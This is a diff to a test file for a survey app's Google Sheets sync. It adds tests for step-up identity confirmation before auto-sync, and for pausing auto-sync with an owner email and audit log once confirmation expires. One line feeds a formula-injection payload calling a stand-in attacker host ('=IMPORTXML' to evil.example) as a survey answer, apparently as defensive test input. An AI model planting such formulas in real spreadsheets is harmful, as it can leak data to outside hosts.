@@ -4,8 +4,9 @@ import type { FastifyInstance } from 'fastify';
 import { encryptSecret } from '../src/lib/crypto';
 import { prisma } from '../src/lib/prisma';
 import { redis } from '../src/lib/redis';
+import { readMockMailbox } from '../src/services/mail';
 import { closeBrowser } from '../src/services/exports/pdf';
-import { answerIdFor, buildWorld, makeApp, replyMsg, resetAll, say, templateBtn, textMsg, type World } from './helpers';
+import { TEST_PASSWORD, answerIdFor, buildWorld, makeApp, replyMsg, resetAll, say, templateBtn, textMsg, type Client, type World } from './helpers';
 
 let app: FastifyInstance;
 beforeAll(async () => { app = await makeApp(); });
@@ -85,6 +86,8 @@ describe('PDF export', () => {
 });
 
 describe('Google Sheets sync', () => {
+  /** Turning auto-sync on needs "confirm it is you" at any size (SEC-20). */
+  const confirmIdentity = (c: Client) => c.post('/api/auth/step-up', { method: 'password', secret: TEST_PASSWORD });
   function stubGoogle() {
     const calls: Array<{ url: string; body: any }> = [];
     vi.stubGlobal('fetch', vi.fn(async (input: any, init?: any) => {
@@ -106,6 +109,7 @@ describe('Google Sheets sync', () => {
     await complete(w, 0, '=IMPORTXML("http://evil.example","//a")');
     await complete(w, 1);
     const calls = stubGoogle();
+    await confirmIdentity(w.owner);
 
     const first = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
     expect(first).toMatchObject({ status: 200, enabled: true, autoSync: true, spreadsheetUrl: 'https://docs.google.com/spreadsheets/d/SID1', rowsSynced: 2 });
@@ -141,9 +145,54 @@ describe('Google Sheets sync', () => {
     expect(appends(calls).length).toBe(before);
   });
 
+  it('turning auto-sync on needs "confirm it is you" at any size; a one-off sync of a small survey does not (SEC-20)', async () => {
+    const w = await buildWorld(app, { contacts: 2, plan: 'growth' });
+    await prisma.googleConnection.create({ data: { userId: w.owner.userId, email: 'jp@example.com', refreshToken: encryptSecret('refresh-token-1') } });
+    stubGoogle();
+    const refused = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
+    expect(refused).toMatchObject({ status: 403, error: 'step_up_required' });
+    expect(await prisma.sheetSync.count()).toBe(0);
+    expect((await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: false })).status).toBe(200);
+    await confirmIdentity(w.owner);
+    const on = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
+    expect(on).toMatchObject({ status: 200, autoSync: true, autoSyncActive: true, autoSyncPaused: false });
+    expect(new Date(on.autoSyncConfirmedUntil).getTime() - Date.now()).toBeGreaterThan(29 * 86_400_000);
+    expect(await prisma.auditLog.count({ where: { action: 'sheets_autosync_confirmed', userId: w.owner.userId } })).toBe(1);
+  });
+
+  it('auto-sync pauses SHEETS_AUTOSYNC_DAYS after the last confirmation: new rows wait, the owner is told once, and the next confirmation sends what is missing (SEC-20)', async () => {
+    const w = await buildWorld(app, { contacts: 3, plan: 'growth' });
+    await prisma.googleConnection.create({ data: { userId: w.owner.userId, email: 'jp@example.com', refreshToken: encryptSecret('refresh-token-1') } });
+    const email = (await prisma.user.findUniqueOrThrow({ where: { id: w.owner.userId } })).email;
+    const calls = stubGoogle();
+    await confirmIdentity(w.owner);
+    await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
+    const base = appends(calls).length;
+
+    await complete(w, 0);
+    await vi.waitFor(() => expect(appends(calls).length).toBe(base + 1)); // inside the window rows flow
+
+    await prisma.sheetSync.updateMany({ data: { autoSyncConfirmedAt: new Date(Date.now() - 31 * 86_400_000) } }); // the window has passed
+    await complete(w, 1);
+    await complete(w, 2);
+    await vi.waitFor(async () => expect((await readMockMailbox(email)).filter((m) => m.kind === 'sheets_sync_paused')).toHaveLength(1));
+    expect(appends(calls).length).toBe(base + 1); // nothing was pushed
+    expect((await readMockMailbox(email)).filter((m) => m.kind === 'sheets_sync_paused')).toHaveLength(1); // once per pause, not once per completion
+    expect(await prisma.auditLog.count({ where: { action: 'sheets_autosync_paused', userId: w.owner.userId } })).toBe(1);
+    expect(await w.owner.get(`/api/surveys/${w.surveyId}/sync`)).toMatchObject({ enabled: true, autoSync: true, autoSyncActive: false, autoSyncPaused: true });
+
+    // confirming again resumes it and sends the two rows that waited
+    const back = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
+    expect(back).toMatchObject({ status: 200, autoSyncActive: true, autoSyncPaused: false });
+    expect(appends(calls).length).toBe(base + 2);
+    expect(appends(calls).at(-1)!.body.values).toHaveLength(2);
+    expect((await prisma.sheetSync.findFirstOrThrow()).autoSyncPausedAt).toBeNull();
+  });
+
   it('asks to reconnect when Google revoked access', async () => {
     const w = await buildWorld(app, { contacts: 1, plan: 'growth' });
     await prisma.googleConnection.create({ data: { userId: w.owner.userId, refreshToken: encryptSecret('rt') } });
+    await confirmIdentity(w.owner);
     vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify({ error: 'invalid_grant', error_description: 'Token has been expired or revoked.' }), { status: 400 })));
     const r = await w.owner.post(`/api/surveys/${w.surveyId}/sync/google-sheets`, { autoSync: true });
     expect(r).toMatchObject({ status: 409, error: 'google_reauth_required' });
